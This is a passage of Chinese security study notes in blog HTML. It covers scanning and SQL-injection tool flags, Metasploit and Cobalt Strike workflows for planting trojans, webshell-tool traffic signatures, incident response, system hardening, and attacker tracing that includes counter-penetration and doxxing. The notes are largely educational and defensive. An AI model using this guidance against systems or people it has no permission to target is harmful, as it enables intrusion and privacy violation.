SYN半连接扫描，速度较快，不会留下日志</li>\n<li>-sN：null扫描，标志位全为0，不适用Windows</li>\n<li>-sF：FIN扫描，标志位FIN&#x3D;1，不适用Windows</li>\n<li>-O：查看目标主机系统版本</li>\n<li>-sV：探测服务版本</li>\n<li>-A：全面扫描</li>\n<li>-Pn：穿透防火墙进行扫描</li>\n<li>-sC：使用nmap的默认脚本</li>\n<li>--open：只显示开放的端口</li>\n</ul>\n<h4 id=\"sqlmap的基本使用\"><a href=\"#sqlmap的基本使用\" class=\"headerlink\" title=\"sqlmap的基本使用\"></a>sqlmap的基本使用</h4><ul>\n<li>--dump：拖库</li>\n<li>-u：指定URL</li>\n<li>--level：注入的等级</li>\n<li>--dbs：获取数据库</li>\n<li>--current-db：查看当前应用程序所用数据库</li>\n<li>--tables -D “数据库”：获取指定数据库的数据表名</li>\n<li>--columns -T “表名” -D “库名”：获取数据库的指定数据表的字段名</li>\n<li>--cookie：指定cookie</li>\n<li>--os-shell：获取shell</li>\n<li>--is-dba：查看是否是管理员权限</li>\n<li>--data：POST提交方式</li>\n<li>--forms：指定为post方式</li>\n<li>-p：指定测试参数</li>\n<li>--tamper：指定sqlmap的插件</li>\n<li>--os-shell：获取shell权限</li>\n</ul>\n<h4 id=\"wireshark的基本使用\"><a href=\"#wireshark的基本使用\" class=\"headerlink\" title=\"wireshark的基本使用\"></a>wireshark的基本使用</h4><ol>\n<li><p>协议 contains “关键字”：指定协议指定关键字搜索，eg：tcp contains “flag”</p>\n</li>\n<li><p>tcp.port&#x3D;&#x3D;”端口”：指定端口搜索</p>\n</li>\n<li><p>ip.addr&#x3D;&#x3D;IP地址：过滤出所有IP协议中源或目的IP等于指定IP的数据包</p>\n</li>\n<li><p>ip.src&#x3D;&#x3D;IP地址：表示指定源IP地址</p>\n</li>\n<li><p>ip.dst&#x3D;&#x3D;IP地址：表示指定目的IP地址</p>\n</li>\n<li><p>http.request.method：指定http请求方法</p>\n</li>\n<li><p>http.request：只显示http请求</p>\n</li>\n<li><p>http.response：只显示http响应</p>\n</li>\n<li><p>eth.addr&#x3D;&#x3D;Mac地址：显示所有源Mac和目的Mac地址为指定Mac地址的数据包</p>\n</li>\n<li><p>ip.src&#x3D;&#x3D;网段（例如：192.168.1.0&#x2F;24）：过滤一个网段</p>\n</li>\n</ol>\n<h4 id=\"msf的基本使用\"><a href=\"#msf的基本使用\" class=\"headerlink\" title=\"msf的基本使用\"></a>msf的基本使用</h4><ul>\n<li>msfdb：用来管理MSF的数据库的命令<ol>\n<li>msfdb init：启动并初始化数据库</li>\n<li>msfdb reinit：删除并重新初始化数据库</li>\n<li>msfdb delete：删除数据库并停止使用他</li>\n<li>msfdb start、stop、status：启动数据库、停止数据库、启动数据库</li>\n<li>msfdb run：启动数据库并运行msfconsole</li>\n</ol>\n</li>\n</ul>\n<ol start=\"2\">\n<li>msfconsole：<ol>\n<li>help?：显示某一命令的用法</li>\n<li>connect：相当于nc命令</li>\n<li>使用show查看msf提供的资源，常使用show exploits：查看当前可以使用的exp；show targets：查看目标；show payload：查看载荷</li>\n<li>search：搜索模块。简单搜索：search ms17_010</li>\n<li>show options：查看配置项；show missing：查看必配项</li>\n<li>use：使用指定模块<ol>\n<li>set：设置参数</li>\n<li>unset：取消设置参数</li>\n<li>check：检测是否有该漏洞</li>\n<li>back：回到msfconsole根目录</li>\n</ol>\n</li>\n<li>run&#x2F;exploit：开始使用模块，使用exploit -j表示在后台运行</li>\n</ol>\n</li>\n<li>msfvenom：用于生成定制的恶意软件载荷</li>\n</ol>\n<h4 id=\"CS\"><a href=\"#CS\" class=\"headerlink\" title=\"CS\"></a>CS</h4><h5 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h5><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">CobaltStrike是一款渗透测试工具，被业界人称为CS。CobaltStrike分为客户端与服务端，服务端是一个，客户端可以有多个，可用于团队分布式协同操作。</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"使用\"><a href=\"#使用\" class=\"headerlink\" title=\"使用\"></a>使用</h5><figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">一般使用步骤就是，先启动服务端，然后启动客户端连接获得一个可视化的界面，新建监听器来接收会话，生成木马文件(常见.exe可执行文件，office宏病毒，html应用程序类型的后门文件)，上传到受害者主机，当受害者运行该木马文件时目标主机就在CS上线了。</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"其他\"><a href=\"#其他\" class=\"headerlink\" title=\"其他\"></a>其他</h3><h4 id=\"Python常用的库\"><a href=\"#Python常用的库\" class=\"headerlink\" title=\"Python常用的库\"></a>Python常用的库</h4><ul>\n<li>requests：主要用来处理http请求和处理响应</li>\n<li>threading：多线程库</li>\n<li>time：时间库</li>\n<li>re：正则表达式</li>\n<li>itertools：主要用来生成字典</li>\n<li>execjs：生成加密的密码字典</li>\n<li>BeautifulSoup：爬虫库</li>\n</ul>\n<h4 id=\"CDN\"><a href=\"#CDN\" class=\"headerlink\" title=\"CDN\"></a>CDN</h4><blockquote>\n<p>如何识别CDN</p>\n</blockquote>\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">1. 使用nslookup进行查询，查看返回域名解析情况</span><br><span class=\"line\">2. 超级ping</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>如何绕过CDN获取真实IP</p>\n</blockquote>\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">1. 目标邮件系统</span><br><span class=\"line\">2. 扫描敏感文件：phpinfo</span><br><span class=\"line\">3. 国外访问：偏远国家访问可能没有部署CDN</span><br><span class=\"line\">4. 分站域名：分站可能没有部署CDN</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"判断目标主机系统\"><a href=\"#判断目标主机系统\" class=\"headerlink\" title=\"判断目标主机系统\"></a>判断目标主机系统</h4><blockquote>\n<p>如何判断目标主机是Windows还是Linux</p>\n</blockquote>\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">1. 大小写检测，Windows对大小写不敏感</span><br><span class=\"line\">2. ping检测，Windows的TTL一般大于100、Linux一般小于100</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"无法连接3389服务器的情况\"><a href=\"#无法连接3389服务器的情况\" class=\"headerlink\" title=\"无法连接3389服务器的情况\"></a>无法连接3389服务器的情况</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">1. 3389处于关闭状态</span><br><span class=\"line\">2. 端口被修改</span><br><span class=\"line\">3. 防火墙/杀软拦截</span><br><span class=\"line\">4. 处于内网环境</span><br><span class=\"line\">5. 设置了指定用户才能访问</span><br><span class=\"line\">6. 设置了IP白名单</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"MySQL无法访问的原因\"><a href=\"#MySQL无法访问的原因\" class=\"headerlink\" title=\"MySQL无法访问的原因\"></a>MySQL无法访问的原因</h4><figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">1. 站库分离</span><br><span class=\"line\">2. 3306未对外开放</span><br><span class=\"line\">3. 修改了默认端口</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"正向shell和反向shell的区别\"><a href=\"#正向shell和反向shell的区别\" class=\"headerlink\" title=\"正向shell和反向shell的区别\"></a>正向shell和反向shell的区别</h4><figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">1. 正向shell：攻击者连接被攻击者机器，可用于攻击者处于内网，被攻击者处于外网的情况</span><br><span class=\"line\">2. 反向shell：让被攻击者连接攻击者，可用于攻击者处于外网，被攻击者处于内网的情况</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"正向代理和反向代理的区别\"><a href=\"#正向代理和反向代理的区别\" class=\"headerlink\" title=\"正向代理和反向代理的区别\"></a>正向代理和反向代理的区别</h4><blockquote>\n<p>介绍</p>\n</blockquote>\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">1. 反向代理：是指代理服务器来接受网络上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给网络上请求连接的客户端，此时代理服务器对外就表现为一个反向代理服务器</span><br><span class=\"line\">2. 正向代理：是一个位于客户端和目标服务器之间的服务器（代理服务器），为了从目标服务器上获取内容，客户端向代理服务器发送一个请求并指定目标，然后代理服务器向目标服务器转交请求并将获得内容返回客户端。</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>区别</p>\n</blockquote>\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">1. 正向代理是客户端的代理，反向代理是服务器的代理。</span><br><span class=\"line\">2. 正向代理一般是客户端架设的，反向代理一般由服务器架设的</span><br><span class=\"line\">3. 正向代理中服务器不知道真正的客户端到底是谁，反向代理中客户端不知道真正的服务器是谁</span><br><span class=\"line\">4. 正向代理主要用来解决访问限制问题，反向代理则是提供负载均衡、安全防护等作用。</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"流量分析篇\"><a href=\"#流量分析篇\" class=\"headerlink\" title=\"流量分析篇\"></a>流量分析篇</h2><h4 id=\"目录扫描的流量分析\"><a href=\"#目录扫描的流量分析\" class=\"headerlink\" title=\"目录扫描的流量分析\"></a>目录扫描的流量分析</h4><figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">1. 频繁访问同一网站或者服务器：通过穷举的方式来获取隐藏的目录或文件</span><br><span class=\"line\">2. IP地址的多样性：可能会使用代理IP</span><br><span class=\"line\">3. 文件或目录名的特征：例如常见的admin、backup、log等</span><br><span class=\"line\">4. 具有规律性的扫描：例如按照字母顺序、数字顺序进行规律性扫描</span><br><span class=\"line\">5. 大量404错误请求</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"爆破的流量分析\"><a href=\"#爆破的流量分析\" class=\"headerlink\" title=\"爆破的流量分析\"></a>爆破的流量分析</h4><figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">1. 大量失败登录尝试</span><br><span class=\"line\">2. 存在暴力破解的特征</span><br><span class=\"line\">3. 异常的登录时间或频率</span><br><span class=\"line\">4. 大量的登录尝试次数</span><br><span class=\"line\"></span><br><span class=\"line\">判断是否成功：</span><br><span class=\"line\">1. 判断状态码，登录成功与否可能状态码不同</span><br><span class=\"line\">2. 判断回显长度，回显长度可能不同</span><br><span class=\"line\">3. 查看具体的响应包</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"XSS流量分析\"><a href=\"#XSS流量分析\" class=\"headerlink\" title=\"XSS流量分析\"></a>XSS流量分析</h4><figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">1. 包含了恶意代码和脚本</span><br><span class=\"line\">2. 异常的请求来源或UA</span><br><span class=\"line\">3. 包含可疑的字符或语法</span><br><span class=\"line\">4. 存在大量的请求</span><br><span class=\"line\">5. 频繁的请求或异常的请求频次</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"命令执行的流量分析\"><a href=\"#命令执行的流量分析\" class=\"headerlink\" title=\"命令执行的流量分析\"></a>命令执行的流量分析</h4><figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">1. 命令的特征：查看payload可以进行判断</span><br><span class=\"line\">2. 命令的来源</span><br><span class=\"line\">3. 命令执行的结果：命令执行后，目标系统可能会有响应返回结果，可能包含了相关目标系统的敏感信息</span><br><span class=\"line\">4. 修改文件的行为：命令执行可能导致目标系统上的文件进行修改、删除等操作</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"SQL注入的流量分析\"><a href=\"#SQL注入的流量分析\" class=\"headerlink\" title=\"SQL注入的流量分析\"></a>SQL注入的流量分析</h4><figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">1. 在http请求中存在大量的SQL注入语句</span><br><span class=\"line\">2. 在分析流量的时候，可以使用http contains &quot;关键字&quot;来进行过滤流量</span><br><span class=\"line\">3. 可以通过注入的流量判断是否攻击成功，并且可以判断注入点和注入类型</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"文件包含的流量分析\"><a href=\"#文件包含的流量分析\" class=\"headerlink\" title=\"文件包含的流量分析\"></a>文件包含的流量分析</h4><figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">1. 通常含有webshell的常见特性：代码执行函数或者命令执行函数</span><br><span class=\"line\">2. 常以可执行文件的格式进行上传</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"常见webshell管理工具的流量特征\"><a href=\"#常见webshell管理工具的流量特征\" class=\"headerlink\" title=\"常见webshell管理工具的流量特征\"></a>常见webshell管理工具的流量特征</h3><h4 id=\"蚁剑\"><a href=\"#蚁剑\" class=\"headerlink\" title=\"蚁剑\"></a>蚁剑</h4><figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">1. 默认的蚁剑会有两次请求</span><br><span class=\"line\">2. 其请求的主体会经过URL编码</span><br><span class=\"line\">3. 存在ini_set(&quot;display_errors&quot;,&quot;0&quot;)字符特征码</span><br><span class=\"line\">-------------------------------------------------</span><br><span class=\"line\">默认的user-agent请求头是antsword xxx，不过可以修改。</span><br><span class=\"line\">一般将payload进行分段，然后分别进行base64编码，一般具有像eval这样的关键字，然后呢大概率还有@ini_set(&quot;display&quot;,&quot;0&quot;);这段代码。</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"菜刀\"><a href=\"#菜刀\" class=\"headerlink\" title=\"菜刀\"></a>菜刀</h4><figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">1. 请求体中存在eval，base64等特殊字符</span><br><span class=\"line\">2. 菜刀的UA头为百度的UA</span><br><span class=\"line\">3. 请求体中的payload为base64编码</span><br><span class=\"line\">4. 请求体中执行结果为明文，格式为X@Y 结果 X@Y</span><br><span class=\"line\">-------------------------------------------</span><br><span class=\"line\">连接过程中使用base64编码对发送的指令进行加密，其中两个关键payload z1 和 z2，名字都是可变的。</span><br><span class=\"line\">然后还有一段以QG开头，7J结尾的固定代码。</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"冰蝎2-0\"><a href=\"#冰蝎2-0\" class=\"headerlink\" title=\"冰蝎2.0\"></a>冰蝎2.0</h4><figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">1. 使用aes加密发起三次请求</span><br><span class=\"line\">2. 第一次请求服务端产生密钥写入session，session和当前会话绑定，（不同的客户端的密钥也是不同的）</span><br><span class=\"line\">3. 第二次请求是为了获取key</span><br><span class=\"line\">4. 第三次进行通信</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"哥斯拉4-0\"><a href=\"#哥斯拉4-0\" class=\"headerlink\" title=\"哥斯拉4.0\"></a>哥斯拉4.0</h4><figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">1. 在经过base64解码之前，要进行一次反转</span><br><span class=\"line\">2. 在连接的过程中会有三次请求</span><br><span class=\"line\">3. 第一次请求并没有响应内容</span><br><span class=\"line\">4. 第二次请求和第三次请求的内容是相同的</span><br><span class=\"line\">----------------------------------------</span><br><span class=\"line\">1.jsp代码中可能会具有getclass，getclassLoader等关键字，payload使用base64编码等特征。php和asp则是普通的一句话木马。</span><br><span class=\"line\">2.在响应包的cache-control字段中有no-store，no-cache等特征。</span><br><span class=\"line\">3.所有请求中的cookie字段最后面都存在；特征。</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"应急响应篇\"><a href=\"#应急响应篇\" class=\"headerlink\" title=\"应急响应篇\"></a>应急响应篇</h2><h4 id=\"OSI七层模型\"><a href=\"#OSI七层模型\" class=\"headerlink\" title=\"OSI七层模型\"></a>OSI七层模型</h4><figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">从上往下依次是：</span><br><span class=\"line\">1. 应用层</span><br><span class=\"line\">2. 表示层</span><br><span class=\"line\">3. 会话层</span><br><span class=\"line\">4. 传输层</span><br><span class=\"line\">5. 网络层</span><br><span class=\"line\">6. 数据链路层</span><br><span class=\"line\">7. 物理层</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"应急响应的基本思路流程\"><a href=\"#应急响应的基本思路流程\" class=\"headerlink\" title=\"应急响应的基本思路流程\"></a>应急响应的基本思路流程</h4><figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">1. 收集信息：收集客户信息和中毒主机信息，包括样本</span><br><span class=\"line\">2. 判断类型：判断是否是安全事件，何种安全事件，勒索、挖矿、断网、DoS 等等</span><br><span class=\"line\">3. 抑制范围：隔离使受害⾯不继续扩⼤</span><br><span class=\"line\">4. 深入分析：日志分析、进程分析、启动项分析、样本分析方便后期溯源</span><br><span class=\"line\">5. 清理处置：杀掉进程，删除文件，打补丁，删除异常系统服务，清除后门账号防止事件扩大，处理完毕后恢复生产</span><br><span class=\"line\">6. 产出报告：整理并输出完整的安全事件报告</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"应急响应六个阶段\"><a href=\"#应急响应六个阶段\" class=\"headerlink\" title=\"应急响应六个阶段\"></a>应急响应六个阶段</h4><figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">准备、检测、遏制、根除、恢复、跟踪</span><br><span class=\"line\"></span><br><span class=\"line\">1. 准备：包括建立紧急响应团队、制定应急预案、开展演练和培训等，以确保在事件发生时可以应对</span><br><span class=\"line\">2. 检测：监控网络、系统和应用程序，及时发现异常行为、攻击和漏洞等问题，以便迅速做出反应</span><br><span class=\"line\">3. 遏制：采取措施限制安全事件的影响、停止攻击行为，并对受影响的系统或数据进行隔离和保护</span><br><span class=\"line\">4. 根除：通过对受感染、被操纵或遭遇攻击的系统、设备和数据进行检查、清理和恢复等措施，从而彻底根除恶意软件和对网络的攻击</span><br><span class=\"line\">5. 恢复：对被影响的设备或系统进行修复和加固，并恢复业务、应用程序和服务，以便尽快返回正常运行状态</span><br><span class=\"line\">6. 跟踪：跟踪事故发生的原因和过程，分析并总结，总结经验教训，改进应急响应流程和方案，以提高应对未来安全事件的能力</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"应急响应常见事件分类\"><a href=\"#应急响应常见事件分类\" class=\"headerlink\" title=\"应急响应常见事件分类\"></a>应急响应常见事件分类</h4><figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">1. web入侵：网页挂马、主页篡改、webshell</span><br><span class=\"line\">2. 系统入侵：病毒木马、勒索软件、远控后门</span><br><span class=\"line\">3. 网络攻击：DNS劫持、DDOS攻击、ARP欺骗</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"入侵检测\"><a href=\"#入侵检测\" class=\"headerlink\" title=\"入侵检测\"></a>入侵检测</h3><h4 id=\"Windows入侵检测\"><a href=\"#Windows入侵检测\" class=\"headerlink\" title=\"Windows入侵检测\"></a>Windows入侵检测</h4><figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">1. 检查系统账号安全：</span><br><span class=\"line\">\t（1）查看是否有弱口令；</span><br><span class=\"line\">\t（2）远程管理端口是否开放；</span><br><span class=\"line\">\t（3）用D盾查看服务器是否有隐藏账号、克隆账号</span><br><span class=\"line\">2. 检查异常端口、进程：</span><br><span class=\"line\">\t（1）使用netstat -ano进行查看端口连接情况；</span><br><span class=\"line\">\t（2）任务管理器查看进程</span><br><span class=\"line\">3. 检查服务自启动(services.msc)、计划任务(at、schtasks.exe)</span><br><span class=\"line\">4. 检查系统相关信息：</span><br><span class=\"line\">\t（1）查看系统版本（systeminfo）以及补丁信息（hotfix）；</span><br><span class=\"line\">\t（2）查看可疑目录及文件</span><br><span class=\"line\">5. 日志分析（eventvwr.msc）</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"Linux入侵检测\"><a href=\"#Linux入侵检测\" class=\"headerlink\" title=\"Linux入侵检测\"></a>Linux入侵检测</h4><ol>\n<li>账号安全：<ol>\n<li><code>who</code>（pts是远程登录，tty是本地登录）</li>\n<li><code>uptime</code>：查看登录多久、多少用户</li>\n<li>查看<code>/etc/passwd</code>，删除无密码用户</li>\n<li><code>/etc/shadow</code>：设置密码有效期</li>\n</ol>\n</li>\n<li>历史命令：<ol>\n<li>通过history查看历史命令</li>\n<li>在历史命令尾部加上具体时间【在&#x2F;etc&#x2F;profile文件的末尾加上 export HISTTIMEFORMAT&#x3D;”%Y-%m-%d %H:%M:%S “ ，然后 source &#x2F;etc&#x2F;profile 生效】</li>\n</ol>\n</li>\n<li>检查异常端口：</li>\n<li>netstat -antlp|more（more会按也显示文本）</li>\n<li>查看pid所对应的进程文件路径（ls -l &#x2F;proc&#x2F;$PID&#x2F;exe:$PID表示所对应的PID号）</li>\n<li>检查异常进程：<code>ps aux | more</code></li>\n<li>检查开机自启项：<ol>\n<li><code>/etc/rc.local</code></li>\n<li><code>/etc/rc.d/rc[0~6].d</code></li>\n</ol>\n</li>\n<li>检查定时任务：<ol>\n<li><code>crontab -l</code>：列出某个用户cron服务的详细内容</li>\n<li><code>crontab -r</code>：删除指定用户的定时任务（需要谨慎操作）</li>\n<li><code>crontab -e</code>：编辑当前的定时任务</li>\n</ol>\n</li>\n<li>检查服务：<code>chkconfig --list</code>：查看系统运行的服务</li>\n<li>检查异常文件</li>\n<li>检查系统日志</li>\n</ol>\n<h3 id=\"排查\"><a href=\"#排查\" class=\"headerlink\" title=\"排查\"></a>排查</h3><h4 id=\"Linux常用排查命令\"><a href=\"#Linux常用排查命令\" class=\"headerlink\" title=\"Linux常用排查命令\"></a>Linux常用排查命令</h4><figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">系统信息：</span><br><span class=\"line\">    1. 查看当前系统状态：top</span><br><span class=\"line\">    2. 操作系统信息：uname -a</span><br><span class=\"line\">    3. 查看当前系统进程信息：ps</span><br><span class=\"line\">    4. 查看历史命令：history</span><br><span class=\"line\">    5. 列出所有的连接和监听的端口：netstat</span><br><span class=\"line\">    6. 查看谁在使用某个端口：lsof</span><br><span class=\"line\">用户登录：</span><br><span class=\"line\">    1. 查看当前用户登录系统的情况：who</span><br><span class=\"line\">    2. 分析超级权限账户：awk -F: &#x27;&#123;if ($3==0) print $1&#125;&#x27; /etc/passwd</span><br><span class=\"line\">    3. 查看可登录的账户：cat /etc/passwd | grep &quot;/bin/bash&quot;</span><br><span class=\"line\">    4. 查看用户错误的登录信息：lastb</span><br><span class=\"line\">    5. 查看空口令账户：awk -F: &#x27;length($2)==0 &#123;print $1&#125;&#x27; /etc/passwd</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"基线检查\"><a href=\"#基线检查\" class=\"headerlink\" title=\"基线检查\"></a>基线检查</h3><h4 id=\"Linux基线检查\"><a href=\"#Linux基线检查\" class=\"headerlink\" title=\"Linux基线检查\"></a>Linux基线检查</h4><figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">账号管理和授权：</span><br><span class=\"line\">    1. 检查特殊账号，是否存在空密码的账户和root权限账户</span><br><span class=\"line\">    2. 禁用或删除无用账号</span><br><span class=\"line\">    3. 添加口令策略：设置过期时间、连续认证失败次数</span><br><span class=\"line\">    4. 禁止root远程登录</span><br><span class=\"line\">服务：</span><br><span class=\"line\">    1. 关闭不必要的服务</span><br><span class=\"line\">    2. SSH服务安全：</span><br><span class=\"line\">        2.1. 不允许root直接登录：permitrootlogin=no</span><br><span class=\"line\">        2.2. 修改ssh的版本为2</span><br><span class=\"line\">        2.3. 修改允许错误密码次数：MaxAuthTries=3</span><br><span class=\"line\">文件系统：</span><br><span class=\"line\">    1. 设置umask值：在/etc/profile添加行umask 027</span><br><span class=\"line\">    2. 设置登录超时：在/etc/profile将TMOUT=开头的注释去掉，并且设置会TMOUT=180（180秒）</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"Windows安全基线\"><a href=\"#Windows安全基线\" class=\"headerlink\" title=\"Windows安全基线\"></a>Windows安全基线</h4><figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">身份鉴别、访问控制、安全审计、资源控制、剩余信息保护</span><br><span class=\"line\">身份鉴别：</span><br><span class=\"line\">    1. 更改缺省账户</span><br><span class=\"line\">    2. 检查游客账户是否禁用</span><br><span class=\"line\">    3. 密码复杂性要求</span><br><span class=\"line\">    4. 密码长度不能小于8位</span><br><span class=\"line\">访问控制：</span><br><span class=\"line\">    1. 共享账户检查</span><br><span class=\"line\">    2. 远程关机授权</span><br><span class=\"line\">    3. 授权账户登录</span><br><span class=\"line\">安全审计：</span><br><span class=\"line\">    1. 用户登录日志记录</span><br><span class=\"line\">    2. 系统日志完备性检查</span><br><span class=\"line\">    3. 登录超时管理</span><br><span class=\"line\">资源控制：</span><br><span class=\"line\">    1. 登录超时管理</span><br><span class=\"line\">    2. 远程登录超时配置</span><br><span class=\"line\">剩余信息保护：</span><br><span class=\"line\">    1. 不显示上次的用户名</span><br><span class=\"line\">    2. 关机前清除虚拟内存页面</span><br><span class=\"line\">    3. 不启用可还原的加密来存储密码</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"系统加固\"><a href=\"#系统加固\" class=\"headerlink\" title=\"系统加固\"></a>系统加固</h3><h4 id=\"账户安全\"><a href=\"#账户安全\" class=\"headerlink\" title=\"账户安全\"></a>账户安全</h4><figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">windows：</span><br><span class=\"line\">\t1. 不显示上次登录的用户名，防止弱口令爆破；</span><br><span class=\"line\">\t2. 设置账户锁定策略，比如设置登录限制次数，达到多少次锁定多长时间</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">linux：</span><br><span class=\"line\">\t1. 禁用root之外的超级用户：</span><br><span class=\"line\">\t\t1.1. 禁用：使用sudo passwd -l &lt;用户名&gt;</span><br><span class=\"line\">\t\t1.2. 启用：使用sudo passwd -u &lt;用户名&gt;</span><br><span class=\"line\">\t2. 限制普通用户使用sudo提权，或者限制使用sudo提权的权限大小</span><br><span class=\"line\">\t3. 锁定系统中不使用的账号</span><br><span class=\"line\">\t4. 设置登录失败锁定次数、锁定时间</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"口令安全\"><a href=\"#口令安全\" class=\"headerlink\" title=\"口令安全\"></a>口令安全</h4><figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">windows：</span><br><span class=\"line\">\t1. 设置密码复杂性要求</span><br><span class=\"line\">\t2. 设置最小密码长度</span><br><span class=\"line\">\t3. 设置不能使用历史密码</span><br><span class=\"line\"></span><br><span class=\"line\">Linux：</span><br><span class=\"line\">\t1. 检查shadow文件中是否存在空口令账户</span><br><span class=\"line\">\t2. 设置口令复杂度要求</span><br><span class=\"line\">\t3. 设置密码有效期：vim /etc/login.defs</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"服务与端口\"><a href=\"#服务与端口\" class=\"headerlink\" title=\"服务与端口\"></a>服务与端口</h4><figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">1. 关闭或者限制常见的高危端口，例如：22、23、445、3389</span><br><span class=\"line\">\t1.1. windows：使用防火墙限制端口</span><br><span class=\"line\">\t1.2. linux：使用iptables封禁IP或者限制端口</span><br><span class=\"line\">2. 排查计划任务：</span><br><span class=\"line\">\t2.1. windows上使用compmgmt.msc</span><br><span class=\"line\">\t2.2. Linux上查看crontab -l</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"文件权限\"><a href=\"#文件权限\" class=\"headerlink\" title=\"文件权限\"></a>文件权限</h4><figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">Linux上chmod修改文件权限，chattr重要文件设置不可修改权限</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"系统日志审计\"><a href=\"#系统日志审计\" class=\"headerlink\" title=\"系统日志审计\"></a>系统日志审计</h4><figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">系统日志：/var/log/message</span><br><span class=\"line\">cron日志：/var/log/cron</span><br><span class=\"line\">安全日志：/var/log/secure</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"溯源\"><a href=\"#溯源\" class=\"headerlink\" title=\"溯源\"></a>溯源</h3><h4 id=\"溯源的基本步骤\"><a href=\"#溯源的基本步骤\" class=\"headerlink\" title=\"溯源的基本步骤\"></a>溯源的基本步骤</h4><figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">1.攻击源捕获</span><br><span class=\"line\">    安全设备报警，如扫描IP、威胁阻断、病毒木马、入侵事件等</span><br><span class=\"line\">    日志与流量分析，异常的通讯流量、攻击源与攻击目标等</span><br><span class=\"line\">    服务器资源异常，异常的文件、账号、进程、端口，启动项、计划任务和服务等</span><br><span class=\"line\">    邮件钓鱼，获取恶意文件样本、钓鱼网站 URL 等</span><br><span class=\"line\">    蜜罐系统，获取攻击者 ID、电脑信息、浏览器指纹、行为、意图的相关信息</span><br><span class=\"line\">2.溯源反制手段</span><br><span class=\"line\">    IP 定位技术</span><br><span class=\"line\">    根据IP定位物理地址–代理 IP</span><br><span class=\"line\">    溯源案例：通过 IP 端口扫描，反向渗透服务器进行分析，最终定位到攻击者相关信息</span><br><span class=\"line\">    ID 追踪术</span><br><span class=\"line\">    ID 追踪术，搜索引擎、社交平台、技术论坛、社工库匹配</span><br><span class=\"line\">    溯源案例：利用 ID 从技术论坛追溯邮箱，继续通过邮箱反追踪真实姓名，通过姓名找到相关简历信息</span><br><span class=\"line\">    网站 url</span><br><span class=\"line\">    域名 Whois 查询–注册人姓名、地址、电话和邮箱 --域名隐私保护</span><br><span class=\"line\">    溯源案例：通过攻击 IP 历史解析记录/域名，对域名注册信息进行溯源分析</span><br><span class=\"line\">    恶意样本分析</span><br><span class=\"line\">    